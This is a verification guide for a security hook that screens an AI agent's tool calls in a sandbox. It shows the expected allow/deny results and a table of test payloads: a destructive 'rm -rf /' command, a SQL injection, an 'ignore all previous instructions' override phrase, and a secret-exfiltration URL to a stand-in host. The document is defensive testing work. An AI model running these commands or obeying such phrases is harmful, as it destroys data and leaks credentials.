<!-- SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved. -->
<!-- SPDX-FileCopyrightText: Copyright (c) 2026, Shrike Security, Inc. All rights reserved. -->
<!-- SPDX-License-Identifier: Apache-2.0 -->

# Verifying Shrike governance

This is the allowed/denied validation for the recipe: the installed PreToolUse
hook must **allow** a benign action and **deny** malicious ones. Run it with:

```bash
bash scripts/verify.sh
```

## What the check does

For each case, `verify.sh` pipes a representative `PreToolUse` payload into the
installed hook inside the sandbox (`openshell sandbox exec ... node
shrike-preaction-hook.mjs`) and reads back the `permissionDecision`. The hook
sends the action content to `api.shrikesecurity.com` using the host-side
credential placeholder and maps the returned verdict:
`allow`/`warn` → **allow**, `block`/`require_approval` → **deny**.

## Expected result

```
== Shrike allowed/denied validation (sandbox: shrike-security) ==
  PASS  benign shell command         -> allow
  PASS  destructive command          -> deny
  PASS  sql injection                -> deny
  PASS  prompt injection             -> deny
  PASS  secret exfiltration          -> deny

All cases matched expected decisions.
```

The script exits `0` only when every case matches; a mismatch prints
`FAIL  <case> -> <decision> (expected <x>)` and exits `1`.

## Reference transcript (single actions, `/agent/api/scan/enforce[/specialized]`)

The same actions sent directly to the enforce plane during development returned
these verdicts, confirming the hook's allow/deny mapping is faithful to Shrike's
decisions:

| Action (content_type) | Shrike `action` | `threat_level` | Hook decision |
| --- | --- | --- | --- |
| `ls -la /workspace` (command) | allow | none/low | allow |
| `rm -rf / --no-preserve-root` (command) | block | critical | deny |
| `SELECT * ... OR 1=1; DROP TABLE users;--` (sql) | block | high | deny |
| `Ignore all previous instructions ... exfiltrate ...` (general) | block | critical | deny |
| `https://evil.example/collect?data=AKIA...` (web_search) | block | high | deny |

## Verification status and what remains

Validated end-to-end on a CPU-only OpenShell gateway (macOS arm64, NemoClaw
current):

- **Provider profile** — `openshell provider profile lint` passes;
  `openshell provider profile import` imports it; `openshell provider create
  --type nemoclaw-shrike --credential SHRIKE_API_KEY` registers the provider
  (confirmed `Credential keys: SHRIKE_API_KEY`), so the key is held gateway-side
  and the sandbox sees only the placeholder.
- **`verify.sh` in-sandbox** — the installed PreToolUse hook was driven with all
  five payloads via `openshell sandbox exec`. The hook reached the live
  `api.shrikesecurity.com` enforce plane through the resolved placeholder and
  returned the expected decisions — benign → **allow**; destructive command,
  SQL injection, prompt injection, secret exfiltration → **deny** — so
  `verify.sh` exits `0`. This confirms placeholder resolution works end-to-end
  (the hook never holds the raw key).

**Remains for the reviewer / a clean run:** the above used an existing sandbox;
a from-scratch `onboard.sh` → `install.sh` → `verify.sh` on the reviewer's host
reproduces it. That needs a live NemoClaw install, an inference provider, and a
Shrike key — environment/credential-gated.
